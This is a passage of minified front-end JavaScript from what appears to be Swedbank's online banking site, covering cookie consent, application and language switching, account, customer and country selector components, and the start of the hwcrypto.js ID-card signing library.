haredComponents.UICookieConsent.whitelist=Object.keys(SharedComponents.UICookieConsent.categories).reduce(((collection,category)=>(collection[category]=[...Swedbank[Swedbank.sym("cookies")][category],...Swedbank[Swedbank.sym("storage")][category]],collection)),{}),Swedbank.UICookies=class{static getConsentElem(){return document.getElementById("cookie-consent")}static get COOKIES_CHECK_INTERVAL(){return 200}static forceShowConsent(){const modal=Swedbank.UIModals.getActive();modal&&1!==modal.order&&modal.close();try{this.getConsentElem().showInfoView()}catch(e){Swedbank.error("ui-cookie-consent element not found",e)}}static eraseCookie(name,options){this.createCookie(name,"",0,options)}static createCookie(name,value,days=365,options){const params=Object.assign({},{path:"/"},options||{}),today=new Date;today.setTime(today.getTime()+24*days*60*60*1e3);const expires="expires="+today.toUTCString(),samesite="https:"===window.location.protocol?"SameSite=Strict":"",secure="https:"===window.location.protocol?"Secure":"",domain="domain="+SharedComponents.browser.resolveMainDomain(),cookieQuery=[`${name}=${value}`,`path=${params.path}`,domain,expires,samesite,secure].filter((q=>q.trim())).join(";");document.cookie=cookieQuery}static readCookie(name){const nameEQ=name+"=",ca=document.cookie.split(";");for(let i=0;i<ca.length;i++){let c=ca[i];for(;" "===c.charAt(0);)c=c.substring(1,c.length);if(0===c.indexOf(nameEQ))return c.substring(nameEQ.length,c.length)}return null}static areCookiesEnabled(){let r=!1;return this.createCookie("testing","Hello",1,{}),null!=this.readCookie("testing")&&(r=!0,this.eraseCookie("testing",{})),r}},UI.whenDOMReady((()=>{const cookieConsent=Swedbank.UICookies.getConsentElem();cookieConsent.prefix=Swedbank.localStorage.prefix+":";const rest=Swedbank.RestService.get();cookieConsent&&(cookieConsent.languageSwitcher=lang=>{Swedbank.LanguageBar.switchLanguage(lang,"languageChanged")},cookieConsent.destroyUnwantedCookies(),cookieConsent.destroyUnwantedStorage(),setInterval((()=>{cookieConsent.destroyUnwantedCookies(),cookieConsent.destroyUnwantedStorage()}),Swedbank.UICookies.COOKIES_CHECK_INTERVAL),cookieConsent.addEventListener("cookie-consent-changed",(event=>{const consentData=JSON.stringify(cookieConsent.buildConsentValuesFromCheckboxes()),params={pageId:"shared.cookies",consent:consentData,maxAge:cookieConsent.expiresDays,setConsent:"setConsent"},localFallback=()=>{cookieConsent.hasConsentGiven()||Swedbank.UICookies.createCookie(SharedComponents.UICookieConsent.CONSENT_NAME,consentData,cookieConsent.expiresDays)};if(rest.performRequest(params,(resp=>{"OK"===resp.status?Swedbank.log("Cookies consent is set from server."):localFallback()}),(err=>{localFallback(),console.error(err)}),"json"),cookieConsent.getPlugin("analytics").hasTargetingAccepted()){const hash=SharedComponents.Digest.uuidv4();Swedbank.UICookies.createCookie("scp",hash,cookieConsent.expiresDays),Swedbank.UICookies.createCookie("scpa","true",cookieConsent.expiresDays)}if(cookieConsent.getPlugin("analytics").hasAnalyticsAccepted())try{Swedbank.AdobeTracking.whenAnalyticsScriptsReady(null)}catch(err){Swedbank.error("Adobe Analytics error: "+err)}})))})),Swedbank.ApplicationBar=Swedbank.ApplicationBar||class{constructor(){this.initApp=this.applicationBar?this.activeApplication:Swedbank.ApplicationBar.types.PRIVATE}static get types(){return{PRIVATE:"private",BUSINESS:"business",ABOUT:"about"}}static switchToPrivate(){const applicationChangedCallback=()=>{Swedbank.sessionStorage.set("applicationSwitchingFromBusiness",!0,{expiresIn:"2 minutes"}),SharedComponents.eventBus.removeEventListener("application-changed",applicationChangedCallback)},bar=new Swedbank.ApplicationBar;bar.target=this.types.PRIVATE,SharedComponents.eventBus.addEventListener("application-changed",applicationChangedCallback),bar.applicationSwitchHandler()}get applicationBar(){return this.isRedesign()?document.querySelector((this.isDesktop()?".page-header__wrapper":".page-header__tool-bar")+" .page-header__environment"):document.getElementById("application-bar")}get activeApplication(){if(this.isRedesign()){const activeApp=this.applicationBar.querySelector(".page-header__environment-link:disabled");return activeApp?activeApp.dataset.target:Swedbank.ApplicationBar.types.ABOUT}return this.applicationBar.value}get target(){return this._target||Swedbank.ApplicationBar.types.PRIVATE}set target(value){this._target=value}isRedesign(){return document.documentElement.classList.contains("redesign")}isDesktop(){return window.matchMedia("(min-width: 1024px)").matches}setApplicationParams(target,params){this.target=target,this.applicationBar.dataset.params=params?JSON.stringify(params):"{}"}_allowAppSwitchingStrategy(){const chat=document.getElementById("chat");if(chat&&null!==chat.offsetParent){const confirmationMessage=Swedbank.Labels("applicationChangeWillCloseChat"),endChat=document.getElementById("end-chat");endChat&&(endChat.click(),Swedbank.UIModals.confirm(confirmationMessage).then((()=>{Swedbank.UIModals.open("switch-application-modal")})))}else Swedbank.UIModals.open("switch-application-modal");const allowAppModal=document.getElementById("switch-application-modal");allowAppModal&&allowAppModal.addEventListener("modal-close",(()=>{this.applicationBar.value=this.initApp}))}_commonSwitchingStrategy(target){SharedComponents.eventBus.dispatchCustomEvent("application-changed");const params=JSON.parse(this.applicationBar.dataset.params||"{}");params.navigation="yes",Navigate.to(target,params,document.mainForm)}isLiveChatVisible(){return Swedbank.communication.virtualAssistantEnabled&&Swedbank.communication.virtualAssistant.getControl().hasLiveAgent()}onCloseLiveChat(onProceed){const chatbox=Swedbank.communication.virtualAssistant.getControl();chatbox?SharedComponents.ConfirmationDialogTemplate.create({content:UI.html`
          <h2>${chatbox.getLabel("CHANGE_ENVIRONMENT_NOTIFICATION")}</h2>
        `,labelAccept:chatbox.getLabel("ACCEPT_ENVIRONMENT_CHANGE"),labelDecline:chatbox.getLabel("DECLINE_ENVIRONMENT_CHANGE")}).prompt({onAccept:()=>{chatbox.destroy("EnvironmentChange"),onProceed()}}):onProceed()}applicationSwitchHandler(event){if(event&&(this.target=event.target.value||event.target.dataset.target),this.target===Swedbank.ApplicationBar.types.ABOUT)return void this._commonSwitchingStrategy(this.target);document.getElementById("allow-app-switching")?this._allowAppSwitchingStrategy():this.isLiveChatVisible()?this.onCloseLiveChat((()=>{this._commonSwitchingStrategy(this.target)})):this._commonSwitchingStrategy(this.target)}},UI.whenDOMReady((()=>{const bar=new Swedbank.ApplicationBar,applyButton=document.getElementById("choose-application-apply-button"),cancelButton=document.getElementById("choose-application-cancel-button"),logoutButton=document.getElementById("choose-application-logout-button");if(bar.isRedesign()){document.querySelectorAll("button.page-header__environment-link").forEach((button=>{button.addEventListener("click",(event=>{event.preventDefault(),bar.applicationSwitchHandler(event)}))}))}else{bar&&bar.applicationBar&&bar.applicationBar.addEventListener("change",bar.applicationSwitchHandler.bind(bar));document.querySelectorAll("a.environment-link").forEach((link=>{link.addEventListener("click",(event=>{event.preventDefault(),bar.applicationSwitchHandler(event)}))}))}applyButton&&applyButton.addEventListener("click",(()=>{const selectedOption=document.querySelector("input[name='applicationSwitching']:checked");if(selectedOption){document.navForm.allowAppSwitching.value=selectedOption.value,Swedbank.isUiSpaEnabled?Swedbank.SpaService.originalActions.navigateTo(Swedbank.Navigation.pageId):Swedbank.SPA.OriginalActions.navigateTo(Swedbank.Navigation.pageId)}})),logoutButton&&logoutButton.addEventListener("click",(()=>{Swedbank.UIModals.close("switch-application-modal"),document.navForm.action+="?forceLogout=true",Navigate.to(bar.applicationBar.dataset.target||bar.target)})),cancelButton&&cancelButton.addEventListener("click",(()=>{Swedbank.UIModals.close("switch-application-modal"),bar.applicationBar.value=bar.initApp}))})),Swedbank.LanguageBar=Swedbank.LanguageBar||class{get languageBar(){const isRedesign=document.documentElement.classList.contains("redesign");return document.querySelector((isRedesign?".page-header__tool-bar":".page-header__wrapper")+" .page-header__language")}static switchLanguage(lang,changed=null){document.navForm.language.value!==lang&&(SharedComponents.eventBus.dispatchCustomEvent("language-changed"),Swedbank.isUiSpaEnabled?Swedbank.SpaService.originalActions.navigateTo(null,"language",lang,changed):Swedbank.SPA.OriginalActions.navigateTo(null,"language",lang,changed))}},UI.whenDOMReady((()=>{const bar=new Swedbank.LanguageBar;bar&&bar.languageBar&&bar.languageBar.addEventListener("change",(e=>{Swedbank.LanguageBar.switchLanguage(e.target.value)}));const mobileBar=document.getElementById("select-language");if(mobileBar&&mobileBar.addEventListener("change",(e=>{Swedbank.LanguageBar.switchLanguage(e.target.value)})),document.documentElement.classList.contains("redesign")){document.querySelectorAll("button.ui-navitem__lang-item").forEach((item=>{item.addEventListener("click",(event=>{event.preventDefault(),Swedbank.LanguageBar.switchLanguage(event.target.value)}))}))}})),Swedbank.Loading=function(){function LoadingController(){}return LoadingController.prototype=Object.create(null),LoadingController.prototype.constructor=LoadingController,Object.setPrototypeOf(LoadingController,null),LoadingController.prototype.runQueue=function(){if(this.progress)return this.progress;this.progress=this.queue.shift(),this.progress?(Swedbank.toggleLoader(!0),this.progress.then(function(){this.progress=null,this.runQueue()}.bind(this))):Swedbank.toggleLoader(!1)},LoadingController.prototype.waitUntil=function(entry){return this.queue||(this.queue=[]),this.queue.push(entry),this.runQueue(),entry},new LoadingController}(),Swedbank.Search=Swedbank.Search||class{static submitSearch(callback=(()=>{})){ErrorMessage.clear();const searchQueryValue=Swedbank.Search.getSearchQueryValue();return Swedbank.sessionStorage.set("searchQuery",searchQueryValue),Swedbank.Search.makeSearch(searchQueryValue,callback),SharedComponents.eventBus.dispatchCustomEvent("menu-toggle",{active:!1}),!1}static getSearchElement(){return document.querySelector("ui-navsearch")}static getSearchQueryValue(){const value=Swedbank.Search.getSearchElement().input.value.trim();return document.getElementById("content-search-query").value=value,value}static getNewSearchQuery(query){if(query){let searchCriteria=query.split(":");if(searchCriteria.length>0&&"new"===searchCriteria[0])return searchCriteria[1]}return null}static makeSearch(searchQueryValue,callback){const contentSearchResults=document.getElementById("content-search-results");if(""===searchQueryValue)contentSearchResults.innerHTML="";else{const newSearchQuery=this.getNewSearchQuery(searchQueryValue),useNewSearch=null!==newSearchQuery,params={pageId:Swedbank.Navigation.pageId.split(".")[0]+(useNewSearch?".home.search":".search"),searchQuery:useNewSearch?newSearchQuery:searchQueryValue,search:!0};Swedbank.toggleLoader(!0),makeAjaxRequest(document.mainForm,params,(response=>{void 0===response.responseJSON&&(contentSearchResults.innerHTML=response.responseText),callback(searchQueryValue),Swedbank.toggleLoader(!1)}))}}};class UIPercentChange extends SharedComponents.UIElement{static get props(){return{attributes:{value:String,default:String,decimals:{type:Number,default:2}}}}render(){const status=UI.createElement({tagName:"ui-status"}),value=parseFloat(this.value);status.type=value<0?"inactive":value>0?"active":"default",this.innerText="",this.default&&Number.isNaN(value)?status.setInnerText(`${this.default}%`):Number.isNaN(value)?status.setInnerText("-"):status.setInnerText(`${value.toFixed(this.decimals)}%`),this.appendChild(status)}}UIPercentChange.defineElement("ui-percentchange");var Swedbank=Swedbank||{};class SPOEAccountChanger extends SharedComponents.UIElement{static get props(){return{attributes:{fieldId:{name:"field-id",type:String,default:SharedComponents.Digest.randomId()}},children:{control:{selector:"select"}}}}get accountChangeFormName(){return this._accountChangeFormName||""}set accountChangeFormName(value){this._accountChangeFormName=value}get accountChangeCallback(){return this._accountChangeCallback||null}set accountChangeCallback(fn){this._accountChangeCallback=fn}getAccountTitle(id,cut){if(!this.isShowAccountChanger())return"";const account=[].filter.call(Swedbank.User.accounts,(account=>account.id===id))[0];if(!account)return"";const accountTitle=account.alias||account.number;return cut&&accountTitle.length>10?accountTitle.split(" ")[0].substring(0,5)+"***"+accountTitle.split(" ")[0].slice(-3):accountTitle}setSelectedOptionContent(target,id,cut){const option=target.options&&target.options[target.selectedIndex];option&&(option.innerText=this.getAccountTitle(id,cut))}setAccountChangeConfig(formName,callback){this.accountChangeFormName=formName,this.accountChangeCallback=callback}isShowAccountChanger(){return!!(Swedbank.User&&Swedbank.User.accounts&&Swedbank.User.accounts.length)}buildAccountField(){return UI.html`
      <ui-field layout="inline">
        <select id="${this.fieldId}" data-event="spoe-account-change">
          ${Swedbank.User.accounts.map((entry=>UI.html`
              <option value="${entry.id}" selected="${entry.id===Swedbank.User.currentAccountId}">
                ${document.createTextNode(this.getAccountTitle(entry.id,window.matchMedia("screen and (min-width: 1024px)").matches&&entry.id===Swedbank.User.currentAccountId))}
              </option>
            `))}  
        </select>
      </ui-field>
    `}rebuildAccountChanger(){this.desktopMediaQueryList.removeListener(this.handleSmallDesktopMediaChanges),this.isShowAccountChanger()?(this.rebuildChildren(this.buildAccountField()),UI.show(this),this.setAccountChangeConfig("navForm",null),this.desktopMediaQueryList.addListener(this.handleSmallDesktopMediaChanges),this.handleSmallDesktopMediaChanges()):(UI.detachChildNodes(this),UI.hide(this))}handleAccountChange(event){const form=document.forms[this.accountChangeFormName];"function"==typeof this.accountChangeCallback&&this.accountChangeCallback(),event.detail&&form&&(form.elements.account.value=event.detail.originalEvent.target.value,form.submit())}handleSmallDesktopMediaChanges(){this.desktopMediaQueryList.matches?(this.setSelectedOptionContent(this.control,this.control.value,!0),this.control.addEventListener("mouseenter",this.handleMouseoverDropdown),this.control.addEventListener("mouseleave",this.handleMouseoverDropdown)):(this.setSelectedOptionContent(this.control,this.control.value,!1),this.control.removeEventListener("mouseenter",this.handleMouseoverDropdown),this.control.removeEventListener("mouseleave",this.handleMouseoverDropdown))}handleMouseoverDropdown(event){this.setSelectedOptionContent(this.control,this.control.value,"mouseleave"===event.type)}handleUpdate(){this.rebuildAccountChanger()}hydrate(){this.changeObserver=new SharedComponents.EventObserver({name:"change"}),this.changeObserver.observe(this),this.handleUpdate=this.handleUpdate.bind(this),this.handleMouseoverDropdown=this.handleMouseoverDropdown.bind(this),this.handleSmallDesktopMediaChanges=this.handleSmallDesktopMediaChanges.bind(this),this.desktopMediaQueryList=window.matchMedia("screen and (min-width: 1024px)"),SharedComponents.eventBus.addEventListener("update-spoe",this.handleUpdate),this.addEventListener("spoe-account-change",this.handleAccountChange.bind(this)),this.rebuildAccountChanger()}}SPOEAccountChanger.defineElement("spoe-account-changer",UI.css`
    spoe-account-changer {
      display: block;
    }
    
    spoe-account-changer ui-field .ui-field__label:empty {
      display: none;
    }
    
    @media screen and (min-width: 1024px) {
      spoe-account-changer {
        display: flex;
        height: 100%;
        align-items: center;
      }
      
      spoe-account-changer ui-field[layout="inline"] .ui-field__control {
        flex-shrink: 0;
      }
      
      spoe-account-changer ui-field[layout="inline"] select {
        width: 130px;
      }
      
      spoe-account-changer ui-field[layout="inline"] .ui-field__control,
      spoe-account-changer ui-field[layout="inline"] select {
        min-width: unset;
        max-width: unset;
      }
    }
    
    @media screen and (min-width: 768px) and (max-width: 1023.98px) {
      spoe-account-changer ui-field[layout="inline"] select {
        max-width: 300px;
        width: 300px;
      }
    }
    
    @media screen and (max-width: 767px) {
      spoe-account-changer {
        display: block;
      }
      
      spoe-account-changer ui-field[layout="inline"] {
        margin-top: 0;
        padding: 10px 15px;
        border-top: 1px solid var(--ui-color-grey);
      }
    }
  `),Swedbank.SPOEAccountChanger=SPOEAccountChanger;var Swedbank=Swedbank||{};class SPOECountryChanger extends SharedComponents.UIElement{static get props(){return{attributes:{fieldId:{name:"field-id",type:String,default:SharedComponents.Digest.randomId()}},children:{control:{selector:"select"}}}}get rest(){return Swedbank.RestService.get()}get accountService(){return Swedbank.AccountService.get()}isShowCountryChanger(){return!!(Swedbank.User&&Swedbank.User.spoeCountries&&Swedbank.User.spoeCountries.length)}buildCountryField(){return UI.html`
      <ui-field layout="inline" class="-text">
        <ui-dropdown layout="plain" hide-selected="true">
          <select id="${this.fieldId}" data-event="spoe-country-change">
            ${Swedbank.User.spoeCountries.map((entry=>UI.html`
                <option data-flag="${entry.toLowerCase()}" value="${entry}">
                  ${document.createTextNode(Swedbank.Labels("bankCountry"+entry))}
                </option>
              `))}
          </select>
        </ui-dropdown>
      </ui-field>
    `}rebuildCustomerChanger(){this.isShowCountryChanger()&&this.rebuildChildren(this.buildCountryField())}onChangeCountry(country){this.rest.callAction("",{pageId:"business.spoe",country:country}).then((result=>{switch(result.message){case"success":const data={pageId:result.pageId,targetPageId:"business.spoe.agreement"===document.mainForm.pageId.value?"":document.mainForm.pageId.value,errorLanguage:result.language,spoeToken:result.spoeToken},form=UI.createElement({tagName:"form",attributes:{name:"spoeCountries",method:"post",action:result.url,class:"-hidden"},children:Object.keys(data).map((key=>({tagName:"input",attributes:{type:"hidden",name:key,value:data[key]}})))});this.appendChild(form),form.submit();break;case"failure":"smartIdLevelTooLow"===result.failureReason?ErrorMessage.add(Swedbank.Labels("CERTIFICATE_LEVEL_TOO_LOW_SPOE")):(document.navForm.appendChild(UI.createElement({tagName:"input",attributes:{name:"sessionExpirationReasonAjax",type:"hidden",value:result.failureReason}})),Swedbank.isUiSpaEnabled?Swedbank.SpaService.originalActions.navigateTo("business"):Swedbank.SPA.OriginalActions.navigateTo("business"))}}))}handleUpdate(){this.rebuildCustomerChanger()}handleCountryChange(event){event.detail&&event.detail.originalEvent&&event.detail.originalEvent.target&&(this.accountService.isChatVisible()?this.accountService.onCloseChat().then((()=>{this.onChangeCountry(event.detail.originalEvent.target.value)})):this.onChangeCountry(event.detail.originalEvent.target.value))}hydrate(){this.changeObserver=new SharedComponents.EventObserver({name:"change"}),this.changeObserver.observe(this),this.handleUpdate=this.handleUpdate.bind(this),SharedComponents.eventBus.addEventListener("update-spoe",this.handleUpdate),this.addEventListener("spoe-country-change",this.handleCountryChange.bind(this)),this.rebuildCustomerChanger()}}SPOECountryChanger.defineElement("spoe-country-changer",UI.css`
    spoe-country-changer {
      display: block;
    }
    
    spoe-country-changer ui-field .ui-field__label:empty {
      display: none;
    }
    
    spoe-country-changer .ui-option-plain.-control .ui-option-plain__label {
      max-width: unset;
    }
    
    spoe-country-changer ui-field[layout="inline"],
    spoe-country-changer ui-field button + .ui-dropdown__control {
      margin: 0;
    }
  `),Swedbank.SPOECountryChanger=SPOECountryChanger;var Swedbank=Swedbank||{};class SPOECustomerChanger extends SharedComponents.UIElement{static get props(){return{attributes:{layout:{type:String,default:SPOECustomerChanger.layouts.DEFAULT},fieldId:{name:"field-id",type:String,default:SharedComponents.Digest.randomId()}},children:{control:{selector:"select"}}}}static get layouts(){return{DEFAULT:"default",LIST:"list"}}get accountService(){return Swedbank.AccountService.get()}getSymbols(label){if(label){return label.replace(/[\p{P}\p{S}]+/gu,"").trim().split(/\s+/).slice(0,2).map((word=>word.charAt(0))).join("").toUpperCase()||" "}return" "}isShowCustomerChanger(){return!!(Swedbank.User&&Swedbank.User.customers&&Swedbank.User.customers.length)}buildCustomerField(){return UI.html`
      <ui-field class="-text" layout="inline">
        <ui-dropdown layout="plain" maxlength="13">
          <select id="${this.fieldId}" data-event="spoe-customer-change">
            ${Swedbank.User.customers.map((entry=>UI.html`
                <option data-symbol="${this.getSymbols(entry.name)}" value="${entry.id}" selected="${entry.id===Swedbank.User.currentCustomerId}">
                  ${document.createTextNode(entry.name)}
                </option>
              `))}
          </select>
        </ui-dropdown>
      </ui-field>
    `}buildCustomersList(){return UI.html`
      <ul>
        ${Swedbank.User.customers.map((entry=>UI.html`
            <li class="${"spoe-customer-changer__list-item"+(entry.id===Swedbank.User.currentCustomerId?" -selected":"")}"
              data-event="spoe-customer-change"
              data-customerid="${entry.id}">
              <ui-icon-symbolic value="${this.getSymbols(entry.name)}" bgshape="square"
                color="${entry.id===Swedbank.User.currentCustomerId?"orange":null}">
              </ui-icon-symbolic>
              <span>${document.createTextNode(entry.name)}</span>
              <ui-icon glyph="agree" color="orange"></ui-icon>
            </li>
          `))}
      </ul>
    `}rebuildCustomerChanger(){this.isShowCustomerChanger()&&this.rebuildChildren(this.layout===SPOECustomerChanger.layouts.DEFAULT?this.buildCustomerField():this.buildCustomersList())}handleUpdate(){this.rebuildCustomerChanger()}handleCustomerChange(event){if(!(event.detail&&event.detail.originalEvent&&event.detail.originalEvent.target))return;const eventHolder=UI.closestEventHolder(event.detail.originalEvent.target,this);if(!eventHolder)return;const nextCustomerId=eventHolder.getAttribute("data-customerid")||eventHolder.value;Swedbank.User.currentCustomerId!==nextCustomerId&&this.accountService.setCustomer(nextCustomerId)}hydrate(){this.changeObserver=new SharedComponents.EventObserver({name:"change"}),this.clickObserver=new SharedComponents.EventObserver({name:"click"}),this.changeObserver.observe(this),this.clickObserver.observe(this),this.handleUpdate=this.handleUpdate.bind(this),SharedComponents.eventBus.addEventListener("update-spoe",this.handleUpdate),this.addEventListener("spoe-customer-change",this.handleCustomerChange.bind(this)),this.rebuildCustomerChanger()}}SPOECustomerChanger.defineElement("spoe-customer-changer",UI.css`
    spoe-customer-changer {
      display: block;
    }
    
    spoe-customer-changer ui-field .ui-field__label:empty {
      display: none;
    }
    
    @media screen and (min-width: 1024px) {
      spoe-customer-changer {
        display: flex;
        align-items: center;
        height: 100%;
      }
      
      spoe-customer-changer ui-field,
      spoe-customer-changer ui-dropdown {
        width: 100%;
      }
    }
    
    @media screen and (max-width: 1023.98px) {
      spoe-customer-changer .spoe-customer-changer__list-item {
        display: flex;
        align-items: flex-start;
        border-top: 1px solid var(--ui-color-grey);
        padding: 13px 15px;
      }
    
      spoe-customer-changer .spoe-customer-changer__list-item > * + * {
        margin-left: 15px;
      }
    
      spoe-customer-changer .spoe-customer-changer__list-item > span {
        flex-grow: 1;
        font-size: 16px;
        line-height: 24px;
        word-break: break-word;
      }
    
      spoe-customer-changer .spoe-customer-changer__list-item > ui-icon-symbolic:first-child {
        width: 24px;
        height: 24px;
        flex-basis: 24px;
      }
    
      spoe-customer-changer .spoe-customer-changer__list-item > ui-icon[glyph="agree"] {
        visibility: hidden;
        width: 16px;
        height: 20px;
        padding-top: 4px;
      }
    
      spoe-customer-changer .spoe-customer-changer__list-item.-selected > span {
        color: var(--ui-color-orange);
      }
    
      spoe-customer-changer .spoe-customer-changer__list-item.-selected > ui-icon[glyph="agree"] {
        visibility: visible;
      }
    }
  `),Swedbank.SPOECustomerChanger=SPOECustomerChanger;var Swedbank=Swedbank||{};class SPOEBar extends SharedComponents.UIElement{get accountChangeFormName(){return this._accountChangeFormName||""}set accountChangeFormName(value){this._accountChangeFormName=value}get accountChangeCallback(){return this._accountChangeCallback||null}set accountChangeCallback(fn){this._accountChangeCallback=fn}get rest(){return Swedbank.RestService.get()}get accountService(){return Swedbank.AccountService.get()}rebuildSPOEBar(){if(!Swedbank.User)return;UI.rebuildChildren(this,[Swedbank.Navigation.isBusiness()&&this.buildCountryField(),this.buildCustomerField(),this.buildAccountField()].filter((field=>{if(field)return UI.prerenderElementsTree(field,!0),field}))),this.smallDesktopMediaQueryList.removeListener(this.handleSmallDesktopMediaChanges),Swedbank.User.accounts&&Swedbank.User.accounts.length&&(this.setAccountChangeConfig("navForm",null),this.smallDesktopMediaQueryList.addListener(this.handleSmallDesktopMediaChanges),this.handleSmallDesktopMediaChanges())}getAccountField(){return this.querySelector(".spoe-bar__account-field")&&this.querySelector(".spoe-bar__account-field").querySelector("select")}getAccountTitle(id,cut){const accounts=Swedbank.User&&Swedbank.User.accounts;if(!accounts)return"";const account=[].filter.call(accounts,(account=>account.id===id))[0];if(!account)return"";const accountTitle=account.alias||account.number;return cut&&accountTitle.length>10?accountTitle.split(" ")[0].substring(0,5)+"***"+accountTitle.split(" ")[0].slice(-3):accountTitle}setSelectedOptionContent(target,id,cut){const option=target.options&&target.options[target.selectedIndex];option&&(option.innerText=this.getAccountTitle(id,cut))}setAccountChangeConfig(formName,callback){this.accountChangeFormName=formName,this.accountChangeCallback=callback}isEteller(){return Swedbank.Navigation.pageId.indexOf("eteller")>-1}buildCountryField(){const countries=Swedbank.User&&Swedbank.User.spoeCountries;if(!countries||!countries.length)return;const el=UI.createElement({tagName:"ui-field",attributes:{class:"spoe-bar__country-field",layout:this.mobileMediaQueryList.matches?null:"inline",label:Swedbank.Labels("country")},children:[{tagName:"select",attributes:{id:"selectCountry"},children:[].map.call(countries,(country=>({tagName:"option",attributes:{value:country||null},children:[country||""]})))}]});return el.querySelector("select").addEventListener("change",this.handleCountryChange.bind(this)),el}buildCustomerField(){const customers=Swedbank.User&&Swedbank.User.customers;if(!customers||!customers.length)return;const el=UI.createElement({tagName:"ui-field",attributes:{class:"spoe-bar__customer-field",layout:this.mobileMediaQueryList.matches?null:"inline",label:this.isEteller()?null:Swedbank.Labels("company")},children:[{tagName:"select",attributes:{id:"selectCustomers"},children:[].map.call(customers,(customer=>({tagName:"option",attributes:{value:customer.id||null,selected:customer.id===Swedbank.User.currentCustomerId||null},children:[customer.name||""]})))}]});return el.querySelector("select").addEventListener("change",this.handleCustomerChange.bind(this)),el}buildAccountField(){const accounts=Swedbank.User&&Swedbank.User.accounts;if(!accounts||!accounts.length)return;const el=UI.createElement({tagName:"ui-field",attributes:{class:"spoe-bar__account-field",layout:this.mobileMediaQueryList.matches?null:"inline",label:Swedbank.Labels("account")},children:[{tagName:"select",attributes:{id:"selectAccount"},children:[].map.call(accounts,(account=>({tagName:"option",attributes:{value:account.id||null,selected:account.id===Swedbank.User.currentAccountId||null},children:[this.getAccountTitle(account.id,this.smallDesktopMediaQueryList.matches&&account.id===Swedbank.User.currentAccountId)]})))}]});return el.querySelector("select").addEventListener("change",this.handleAccountChange.bind(this)),el}onChangeCountry(country){this.rest.callAction("",{pageId:"business.spoe",country:country}).then((result=>{switch(result.message){case"success":const data={pageId:result.pageId,targetPageId:"business.spoe.agreement"===document.mainForm.pageId.value?"":document.mainForm.pageId.value,errorLanguage:result.language,spoeToken:result.spoeToken},form=UI.createElement({tagName:"form",attributes:{name:"spoeCountries",method:"post",action:result.url,class:"-hidden"},children:Object.keys(data).map((key=>({tagName:"input",attributes:{type:"hidden",name:key,value:data[key]}})))});this.appendChild(form),form.submit();break;case"failure":"smartIdLevelTooLow"===result.failureReason?ErrorMessage.add(Swedbank.Labels("CERTIFICATE_LEVEL_TOO_LOW_SPOE")):(document.navForm.appendChild(UI.createElement({tagName:"input",attributes:{name:"sessionExpirationReasonAjax",type:"hidden",value:result.failureReason}})),Swedbank.isUiSpaEnabled?Swedbank.SpaService.originalActions.navigateTo("business"):Swedbank.SPA.OriginalActions.navigateTo("business"))}}))}handleCountryChange(event){event.target&&(this.accountService.isChatVisible()?this.accountService.onCloseChat().then((()=>{this.onChangeCountry(event.target.value)})):this.onChangeCountry(event.target.value))}handleCustomerChange(event){event.target&&this.accountService.setCustomer(event.target.value)}handleAccountChange(event){const form=document.forms[this.accountChangeFormName];"function"==typeof this.accountChangeCallback&&this.accountChangeCallback(),event.target&&form&&(form.elements.account.value=event.target.value,form.submit())}handleSmallDesktopMediaChanges(){const select=this.getAccountField();this.smallDesktopMediaQueryList.matches?(this.setSelectedOptionContent(select,select.value,!0),select.addEventListener("mouseenter",this.handleMouseoverDropdown),select.addEventListener("mouseleave",this.handleMouseoverDropdown)):(this.setSelectedOptionContent(select,select.value,!1),select.removeEventListener("mouseenter",this.handleMouseoverDropdown),select.removeEventListener("mouseleave",this.handleMouseoverDropdown))}handleMouseoverDropdown(event){const select=this.getAccountField();this.setSelectedOptionContent(select,select.value,"mouseleave"===event.type)}hydrate(){this.handleMouseoverDropdown=this.handleMouseoverDropdown.bind(this),this.handleSmallDesktopMediaChanges=this.handleSmallDesktopMediaChanges.bind(this),this.mobileMediaQueryList=window.matchMedia("screen and (max-width: 1023px)"),this.smallDesktopMediaQueryList=window.matchMedia("screen and (min-width: 1024px) and (max-width: 1210px)"),this.rebuildSPOEBar()}}SPOEBar.defineElement("spoe-bar"),Swedbank.SPOEBar=SPOEBar;var hwcrypto=function hwcrypto(){var _debug=function(x){};function hasExtensionFor(cls){return"function"==typeof window[cls]}function _hex2array(str){if("string"==typeof str){for(var len=Math.floor(str.length/2),ret=new Uint8Array(len),i=0;i<len;i++)ret[i]=parseInt(str.substr(2*i,2),16);return ret}}_debug("hwcrypto.js activated");var extensionMap={ee:"TokenSigning",lv:"eParakstsTokenSigning"},digidoc_chrome=function getExtension(){for(var a in extensionMap)if(hasExtensionFor(extensionMap[a]))return _debug("getExtension() "+extensionMap[a]),extensionMap[a];return _debug("getExtension() default TokenSigning"),"TokenSigning"}(),NO_IMPLEMENTATION="no_implementation";function DigiDocExtension(){this._name="Chrome native messaging extension";var p=null;this.check=function(){return new Promise((function(resolve,reject){if(!hasExtensionFor(digidoc_chrome))return resolve(!1);resolve(!!(p=new window[digidoc_chrome]))}))},this.getVersion=function(){return p.getVersion()},this.getCertificate=function(options){return p.getCertificate(options)},this.sign=function(cert,hash,options){return p.sign(cert,hash,options)}}function NoBackend(){this._name="No implementation",this.check=function(){return new Promise((function(resolve,reject){resolve(!0)}))},this.getVersion=function(){return Promise.reject(new Error(NO_IMPLEMENTATION))},this.getCertificate=function(){return Promise.reject(new Error(NO_IMPLEMENTATION))},this.sign=function(){return Promise.reject(new Error(NO_IMPLEMENTATION))}}var _backend=null,fields={};function _testAndUse(Backend){return new Promise((function(resolve,reject){var b=new Backend;b.check().then((function(isLoaded){isLoaded?(_debug("Using backend: "+b._name),_backend=b,resolve(!0)):(_debug(b._name+" check() failed"),resolve(!1))}))}))}function _autodetect(force){return new Promise((function(resolve,reject){if(_debug("Autodetecting best backend"),void 0===force&&(force=!1),null!==_backend&&!force)return resolve(!0);hasExtensionFor(digidoc_chrome)?_testAndUse(DigiDocExtension).then((function(result){result&&resolve(!0)})):resolve(_testAndUse(NoBackend))}))}return fields.use=function(backend){return new Promise((function(resolve,reject){void 0===backend||"auto"===backend?_autodetect().then((function(result){resolve(result)})):resolve("chrome"===backend&&_testAndUse(DigiDocExtension))}))},fields.debug=function(){return new Promise((function(resolve,reject){_autodetect().then((function(result){_backend.getVersion().then((function(version){resolve("hwcrypto.js 0.0.13 with "+_backend._name+" "+version)}),(function(error){resolve("hwcrypto.js 0.0.13 with failing backend "+_backend._name)}))}))}))},fields.getCertificate=function(options){return"object"!=typeof options?(_debug("getCertificate options parameter must be an object"),Promise.reject(new 